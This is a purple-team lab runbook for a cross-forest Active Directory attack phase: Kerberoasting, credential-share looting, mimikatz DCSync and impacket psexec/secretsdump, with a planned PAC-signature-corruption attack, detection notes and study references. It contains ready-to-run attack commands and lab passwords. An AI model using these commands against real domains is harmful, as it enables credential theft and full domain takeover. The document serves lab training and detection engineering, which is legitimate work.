# CAMPAIGNS v3 — Phase 8 — Cross-Forest + External Domain

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Phase 8 — Cross-Forest + External Domain (WT033-039)


|                   |                                                                       |
| ----------------- | --------------------------------------------------------------------- |
| **Target**        | dc03 (.12) — range.local (external forest)                            |
| **From**          | **dc01 / mbr01** (using cadre.local Enterprise Admin)                 |
| **Starting cred** | Cadre.local EA (from Phase 7)                                         |
| **What you earn** | `s3rv1c3_SCCM!` → `N@A_s3rv1c3!` → **range.local DA** → all 3 domains |
| **MITRE**         | T1550.002 (Use Alternate Auth Mat) + T1078 (Valid Accounts)             |

**Status:**
- **Validated in two independent runs:** scripted run (2026-07-29) via `attack-matrix/04-automation/linux` wrappers + RedStrike orchestrator run (2026-07-29) via `redstrike-campaign --execute --prefer-script`.
- **WT033** ✅ — cross-forest Kerberoast from `ws01` succeeded; captured `svc_mssql` and `svc_sccm` TGS hashes for `range.local`.
- **WT034** ✅ — SCCM NAA credentials extracted from `\\mbr02.range.local\vault\naa-rotation-notice.txt` using `range\svc_sccm` (SCCM Full Admin); NAA account is `range\svc_naa` / `N@A_s3rv1c3!`. Verified `range\svc_naa` is Domain Admin on `dc03`.
- **WT035-039 / Branch C** ✅ **WT037 CMPivot + WT038 app deploy + WT039 script-as-SYSTEM FULL EXEC VERIFIED 2026-08-02** from ws01 as `range\svc_sccm` against the WS01 managed client (enablers: BGB fast channel, svc_sccm Full Admin DB grant, DB script approval, mp.msi MP repair). WT035 PXE still needs a real PXE client; WT036 client-push relay needs a console-created device.
- **Skipjack** ⏳ — still deferred pending custom tool.

**Fallback path already achieved:** root `cadre.local` DA/EA via WT031 (`chief_command`), so the primary campaign objective (root domain compromise) is satisfied. The `range.local` DA step is now also achieved via WT034 NAA extraction.


cadre.local has a bidirectional forest trust with range.local (SID Filter OFF). In the realistic multi-hop chain, the operator uses the cadre.local Enterprise Admin ticket on `mbr01` or a fresh session staged from `dc01` to cross-forest authenticate to `range.local`.

**Step 1 — From mbr01, request a cross-forest TGT for range.local using cadre EA:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe asktgt /user:Administrator /domain:cadre.local /rc4:<cadre_ea_ntlm> /dc:192.168.77.10 /ptt"
```

**Step 2 — Cross-forest Kerberoast from mbr01 against dc03:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe kerberoast /domain:range.local /dc:192.168.77.12 /tgtdeleg"
```

**Step 3 — Use cracked SCCM cred to read NAA from mbr02 vault share:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "net use \\mbr02.range.local\vault /user:range.local\svc_sccm s3rv1c3_SCCM!; type \\mbr02.range.local\vault\naa-rotation-notice.txt"
# Contains: "Network Access Account RANGE\svc_naa : N@A_s3rv1c3!"
```

**Step 4 — DA on dc03:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:range.local /user:krbtgt\" \"exit\""
```

**Fallback from Kali:**

```bash
# Cross-forest Kerberoast
impacket-GetUserSPNs cadre.local/chief_command:'C0mm@nd_Ch1ef!' \
  -target-domain range.local -dc-ip 192.168.77.12 -request

# Read NAA bait file on vault share
smbclient //192.168.77.23/vault -U range.local/svc_sccm%'s3rv1c3_SCCM!' \
  -c "get naa-rotation-notice.txt"

# svc_naa is Domain Admin in range.local
impacket-psexec range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
impacket-secretsdump -just-dc range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
```

**Alternative SQL execution on mbr02 (WT042):** CLR Assembly — mbr02 has CLR enabled, `clr strict security=0`, and `TRUSTWORTHY ON` (per `09-sql-wsus-verify.yml`). Requires `analyst_t1` IMPERSONATE → linked server to mbr02 → CLR assembly for OS exec.

---

#### Skipjack — Cross-Forest Trust Downgrade via PAC Signature Corruption (Phase 8 alt) ⏳

**Source:** https://blog.ghostwolflab.com/redteam/786/ — "PAC 签名无效引发的域信任降级攻击" (Domain Trust Downgrade Attack Caused by Invalid PAC Signatures), 2026-06-23. See Campaign_suggestions.md #97.

**Vulnerability mechanism:**
- Kerberos PAC is signed with **two signatures** (service + KDC) for integrity
- When signature verification **fails**, Windows DCs have a **downgrade fallback**: look up user in local AD database + rebuild token from AD groups
- **In cross-forest trust scenarios where SID filtering is disabled**, an attacker can:
  1. Get a TGT in Forest A
  2. Modify PAC to inject Forest B's Domain Admins SID (`S-1-5-21-<B>-519`)
  3. **Delete or corrupt PAC signatures** (so verification fails)
  4. Submit forged TGT to Forest B's DC
  5. DC signature verification fails → enters downgrade mode
  6. Downgrade mode rebuilds token BUT keeps forged SIDs (SID filter OFF)
  7. **Attacker becomes Domain Admin in Forest B**

**CADRE applicability: HIGH** (all pre-conditions met):
- ✅ 2 forests (cadre.local, range.local) with cross-forest trust
- ✅ **SID Filter OFF** (verified in `01-core-ad.yml:50`)
- ✅ Attacker controls user in one forest (e.g., `intern_blue` in child.cadre.local)
- ✅ Target forest has user with same name OR SID injection allowed

**Skipjack vs current Phase 8 (Golden Ticket):**
| Method | Mechanism | Requires krbtgt hash? | Detection surface |
|---|---|---|---|
| Golden Ticket (current Phase 8) | Forge TGT with krbtgt hash + SID history | ✅ Yes (DCSync first) | Anomalous ticket encryption, no legitimate AS-REQ |
| **Skipjack (new)** | Modify legitimate TGT + corrupt signatures + inject SID | ❌ **No** | Legitimate AS-REQ + 4826 PAC verification failed |

**Test plan (gated on custom tool):**
```bash
# Step 1: Get legitimate TGT in child.cadre.local (Forest A)
# From Kali as intern_blue
getTGT.py child.cadre.local/intern_blue:'1nt3rn_Blu3!' -dc-ip 192.168.77.11
# Or Rubeus on mbr01
Rubeus.exe asktgt /user:intern_blue /password:'1nt3rn_Blu3!' /domain:child.cadre.local /dc:DC02.child.cadre.local /enctype:aes256

# Step 2: Modify PAC — inject S-1-5-21-<cadre.local-domain>-519 (Enterprise Admins)
# AND delete/corrupt PAC signatures
# (requires custom Rubeus build or skipjack_forge.py implementation)

Rubeus.exe asktgt /user:intern_blue /password:'1nt3rn_Blu3!' /domain:child.cadre.local \
  /injectSID:S-1-5-21-<cadre.local-domain>-519 /corruptSignature
# (Rubeus needs custom compile for /corruptSignature flag)

# Step 3: Submit forged TGT to target forest (cadre.local root DC)
Rubeus.exe asktgs /service:cifs/DC01.cadre.local /ticket:doIF... /ptt

# Step 4: Verify Domain Admin in cadre.local
Rubeus.exe describe /ticket:doIF...
# Should show: "Enterprise Admins" group SID present in token

# Step 5: Profit
dir \\DC01.cadre.local\C$
```

**Detection:**
- **WinSec 4826** (PAC verification failed) — primary signal
- **WinSec 4769** (TGS request) with corrupted PAC data
- **Zeek kerberos.log** — inter-realm TGT requests with anomalous auth-data
- **Suricata SID:1000015** extended for PAC signature anomalies
- **Defender recommended:** `HKLM\System\CurrentControlSet\Services\Kdc\Parameters\KdcValidatePac = 1`

**Why it's a Phase 8 alternative:**
- Doesn't require DCSync (no krbtgt hash needed)
- Tests downgrade behavior assumption (currently unverified for CADRE)
- Complements existing Phase 8 (different mechanism, same outcome: DA in target forest)
- High stealth if 4826 events not monitored

**Defense (per GhostWolfLab + Microsoft):**
- **Enable SID filtering** on all cross-forest trusts — closes the attack entirely
- **Force PAC validation:** Group Policy → `KdcValidatePac = 1`
- **Monitor 4826 events** (rare in healthy environment — should alert on any)
- **ESAE** (Enhanced Security Admin Environment) for high-priv accounts

**Status:** ⏳ Pending — needs custom Rubeus build with `/corruptSignature` flag, or `skipjack_forge.py` Python implementation per blog pseudocode. Test in lab after current Phase 8 (Golden Ticket) verified.

**Cross-references:**
- Campaign_suggestions.md #97 (full entry with mechanism, pre-conditions, references)
- Item #66 Forest Trust SID Filtering — root cause fix
- Item #67 CVE-2020-0665 Trust Bypass — related forest trust bypass
- Phase 8 (Forest Trust Escalation) — current SID injection via Golden Ticket

---



---

## Study references (read before this phase)

### Phase 8 — Forest Trust (read BEFORE testing)

#### 📖 Forest Trust SID Filtering — Dirk-jan Mollema

**Why read:** Forest trust abuse in Phase 8 depends critically on whether SID Filtering is enabled on the trust. Server 2025 forest trusts default to SID Filtering DISABLED (we verified in `01-core-ad.yml:50`). Without this context, the Phase 8 attacks look like magic.

**Source:** [Not A Security Boundary: Kerberos Constrained Delegation Abuse Across Forest Trusts — dirkjanm.io](https://dirkjanm.io/krb-delegation-across-forests/)

**Key concepts to internalize:**

- SID Filtering strips foreign SIDs from incoming tickets at the trust boundary
- When DISABLED (CADRE default), any SID in cadre.local can be embedded in tickets from range.local
- This enables the SID History injection in WT010-012
- Detection: monitor `4662` events on `CN=ForeignSecurityPrincipals` and `5136` events for SID History modifications

**Action item:** Read before Phase 8. Cross-reference with the SID filter footnote in the CAMPAIGNS_v3.md topology diagram.

#### 📖 CVE-2020-0665 — Forest Trust Privilege Escalation — Dirk-jan Mollema

**Why read:** Even when SID Filtering is enabled, CVE-2020-0665 (NTLM relay via MRxSmb10.sys) provides an alternative path. While patched in Server 2025, the study helps understand the threat model.

**Source:** [CVE-2020-0665 — dirkjanm.io](https://dirkjanm.io/cve-2020-0665/)

**Action item:** Reference reading only. CVE-2020-0665 is patched in Server 2025. Include in the "what didn't work" section of the campaign post-mortem.

#### 📖 Windows Security Internals (James Forshaw, 2023) — Reference Book for Kerberos + AD

**Why read:** Forshaw (Project Zero) is the leading Windows security researcher. This book provides the deepest available coverage of the Kerberos protocol (Ch 14), AD security descriptors (Ch 11), access tokens (Ch 4), and security auditing (Ch 9). **Direct relevance:**
- Chapter 14 (Kerberos) explains TGT, TGS-REQ, AS-REP, PAC structure in detail — supports Phase 1 (AS-REP), Phase 2 (Kerberoast), Phase 7 (Golden Ticket), Skipjack (#97), Onelogon (#76)
- Chapter 11 (Active Directory) explains security descriptors, ACE inheritance, default DACLs — supports Branch A (14 ACEs), Branch B (ADCS CA ACLs)
- Chapter 9 (Security Auditing) explains SACL configuration — supports plan1.7 detection engineering

**Source:** `CADRE-Courses/NoStarchPress_extract/WindowsSecurityInternals_11172023/` (1.3MB .txt, 19.6MB .html). See Campaign_suggestions.md #100.

**Concrete techniques extracted from this book (see Campaign_suggestions.md):**
- **#102 dsHeuristics abuse** (Ch 11) — forest-level attribute for AD behavior modification. Read via LDAP in Phase 0.
- **#103 UAC bit exploitation beyond DONT_REQ_PREAUTH** (Ch 10, 11) — enumerate all 20+ UAC flags (TRUSTED_FOR_DELEGATION, TRUSTED_TO_AUTH_FOR_DELEGATION, DONT_EXPIRE_PASSWORD, etc.) in Phase 0/1/5.
- **#104 ms-DS-Machine-Account-Quota check** (Ch 11) — pre-flight check before WT007 RBCD (quota > 0 enables path).
- **#105 SACL/audit policy manipulation** (Ch 9) — DETECT this in plan1.7 (WinSec 4907/4719).

**Action item:** Read **before executing Phase 1, 2, 7, or testing Skipjack/Onelogon** (items #76, #97). PowerShell examples use NtObjectManager module. Treat as the primary reference for Kerberos protocol mechanics in our campaign.

#### 📖 Practical Purple Teaming (Chase Petrey) — Reference Book for Lab + DFIR

**Why read:** Comprehensive guide to running purple team exercises. Direct relevance:
- Chapter 6 (Collecting Telemetry) — patterns for Suricata/Zeek/Sysmon/WinSec correlation that match our plan1.7
- Chapter 8 (Atomic Red Team) — execution framework with 1000+ tests that complement our manual CAMPAIGNS_v3.md commands
- Chapter 9 (Caldera AD Recon) — adversary emulation automation (already in our Track B Parallel Tracks)
- Chapter 10 (Mythic C2) — C2 operations (relevant to Plan 10 + Loki integration)
- Chapter 11 (Reporting + Tracking) — directly relevant to our `tracker.md` workflow + DFIR-Nexus case reports

**Source:** `CADRE-Courses/NoStarchPress_extract/Practical_Purple_Teaming-0642572230173/` (725KB .txt, 770KB .html). See Campaign_suggestions.md #101.

**Concrete techniques extracted from this book (see Campaign_suggestions.md):**
- **#106 Atomic Red Team as validation framework** (Ch 8) — 1000+ pre-built MITRE ATT&CK tests for cross-validation of our manual CAMPAIGNS_v3.md attacks. Run `Invoke-AtomicTest T1003.001,T1558.003,... -ShowDetails` per phase.

**Action item:** Read **before plan1.7 detection engineering work** and **before DFIR-Nexus integration**. Use Ch 6 telemetry patterns + Ch 8 Atomic Red Team tests to validate our detection coverage.

#### 📖 ebooks/ Survey (2026-06-25) — 11 books as study reference

Survey of `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\` (75 .txt files). Term-frequency analysis for AD attack vocabulary + DFIR/detection keywords. See Campaign_suggestions.md "CADRE-Courses/ebooks Survey" section for full survey methodology + deprioritized/skip lists.

**Tier 1 (7 books — full reference):**

#### 📖 SANS Purple Team Tools Poster (Van Buggenhout/Bauters) — Whole kill-chain reference
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\UTF-8=''Digital-Poster_Purple-Team_Tools\` (64 KB). Single highest-value new doc.
**Covers:** BloodHound, Mimikatz, PowerView, PowerUp, C2 matrix (Covenant/Empire/SilentTrinity/Sliver), Suricata, Sigma, Sysmon, AppLocker, OSSEC, OSQuery + FIN6/APT28/APT33 emulation with MITRE technique IDs (T1566.002, T1547.001, T1560.001, T1059.001, T1003.001, T1567.002, T1047).
**Action item:** Read **before starting any new phase** — one-stop reference for red/blue tools. Use FIN6 emulation plan as template if we add a "full-scope attack" scenario.

#### 📖 Practical-Red-Teaming (Sarang Tumne, 2023) — Field-tested red team playbooks
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Practical-Red-Teaming\` (317 KB). 81 AD attack matches (Mimikatz x34, Rubeus x7, Kerberoast x4, Golden Ticket x3, ProcDump x2, Zerologon).
**Covers:** Phase 1-3 AD attack chains. Likely has Rubeus/Kerberoast/AS-REP walk-throughs.
**Concrete techniques extracted (see Campaign_suggestions.md):**
- **#109 AMSI Bypass** — disable AMSI before PowerShell payload
- **#111 Rubeus/Kerberoast/AS-REP cross-validation** — verify existing Phase 1/2/7 commands
**Action item:** Cross-validate Phase 1-3 commands against book recommendations. Look for missing flags.

#### 📖 Applied Incident Response (Steve Anson) — DFIR textbook
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Applied Incident Response\` (1002 KB). 146 AD + 410 DFIR matches. 14 chapters (Threat Landscape → IR → Memory/Disk Forensics → Lateral Movement).
**Covers:** Mimikatz x25, Kerberoast x17, schtasks x12, Silver Ticket x7, DCShadow x5, Golden Ticket x5, DCSync x4, Rubeus x3.
**Concrete techniques extracted (see Campaign_suggestions.md):**
- **#110 DCShadow** — inverse of DCSync, push fake SID history via DRS replication
**Action item:** Cross-validate DFIR-Nexus telemetry sources against this textbook's IR chapter coverage.

#### 📖 Gray Hat Hacking 6th Ed (Harper/Harris et al.) — Industry handbook
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Gray_Hat_Hacking_The_Ethical_Hacker_s_Handbook,_Sixth_Edition,_6th\` (1720 KB). 78 AD matches including AMSI bypass x4.
**Covers:** Mimikatz x32, SharpHound x7, DCSync x5, Rubeus x5, AMSI bypass x4, Kerberoast x4, wmiexec x4, AS-REP x3, Golden Ticket x3.
**Concrete techniques extracted (see Campaign_suggestions.md):**
- **#109 AMSI Bypass** — multiple techniques (amsiInitFailed, AmsiScanBuffer patch)
- **#111 Rubeus/Kerberoast/AS-REP cross-validation** — additional Rubeus flags
**Action item:** Read AMSI bypass chapter before Phase 3 Execution testing. Use as primary reference for any new detection evasion techniques.

#### 📖 Windows Internals Part 1, 7th Ed (Russinovich/Solomon/Ionescu, 2017) — LSASS/AD internals
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Windows Internals, Part 1, 7th Edition - 2017\` (1720 KB). token x435, LSASS x98, UAC x78, Credential Guard x47, Kerberos x30, AD x23, TGT x18.
**Covers:** Process/thread internals, memory management, security mechanisms (UAC/Credential Guard/VBS), token model, Kerberos protocol details.
**Action item:** Read **before Phase 3.5 (Credential Theft)** + Phase 6 (Lateral Movement). Supplements our existing `WindowsSecurityInternals` with deeper internals.

#### 📖 Cyber Threat Hunting — Hypothesis-driven hunting methodology
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Cyber_TH\` (838 KB). 507 DFIR mentions. Hypothesis-driven hunting + ML clustering + deception + MITRE ATT&CK mapping.
**Action item:** Read **before plan1.7 detection engineering**. Use as primary methodology reference for hypothesis-driven hunt writing.

#### 📖 Practical Threat Detection Engineering (Mihailescu) — Detection engineering methodology
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Practical.Threat.Detection.Engineering\` (616 KB). Whisker x3, ProcDump x8, Zerologon. Methodology + Sigma rule writing.
**Action item:** Read **before plan1.7 §16 (Sigma Rule Library)**. Direct reference for Sigma rule authoring best practices.

**Tier 2 (4 books — selective reference):**

#### 📖 Practical AI Security (2025) — LLM security for CADRE-Strike
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Practical AI Security\` (837 KB, 2025). Prompt injection x72, RAG x112, backdoor x41, supply chain x29, jailbreak x12.
**Covers:** LLM attack surface (prompt injection, RAG poisoning, backdoor, supply chain).
**Action item:** Read **before CADRE-Strike sister repo creation + `claude-code-action` integration**. Provides prompt injection defenses (orthogonal to Item #107 GitHub Actions guardrails).

#### 📖 Brc4 — Dense AD cheat sheet
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Brc4\` (204 KB). Mimikatz x17, Process Injection x8, DCSync x6, smb x57.
**Action item:** Quick syntax lookup when implementing Phase 3.5 + Phase 5 attacks.

#### 📖 Windows Internals Part 2, 7th Ed (2021) — Storage/I/O/networking/registry internals
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\Windows Internals, Part 2. 7th Edition - 2021\` (1720 KB). Less AD-specific than Part 1.
**Action item:** Reference for plan1.7 EDR rule writing (Sysmon EID 11/12/13/14 — file create/modify/delete/rename).

#### 📖 eb-powershell-in-a-month-of-lunches (Don Jones/Jeff Hicks) — PowerShell fundamentals
**Source:** `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\ebooks\eb-powershell-in-a-month-of-lunches\` (647 KB). WinRM/PSRemoting x9, Get-AdUser x6, Invoke-Command x4.
**Action item:** Reference for Phase 3.5/5+ PowerShell scripting (PSRemoting, WMI, AD module).

### How to use this section

1. **Before each phase**, look for the matching `📖` entry. Read the source article if you haven't.
2. **During the phase**, cross-reference detection sources — the article often lists which logs/RPC opnums to watch.
3. **After the phase**, if the article mentions a technique we didn't execute, decide whether to add to `Campaign_suggestions.md` as a new item.
4. **Adding new study refs:** When `Campaign_suggestions.md` Tier 3 / study-ref items are identified, add them here with a clear phase tag.

---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-7.md`](CAMPAIGNS-RUNBOOK-7.md) · Next: [`CAMPAIGNS-RUNBOOK-branch-a.md`](CAMPAIGNS-RUNBOOK-branch-a.md) →
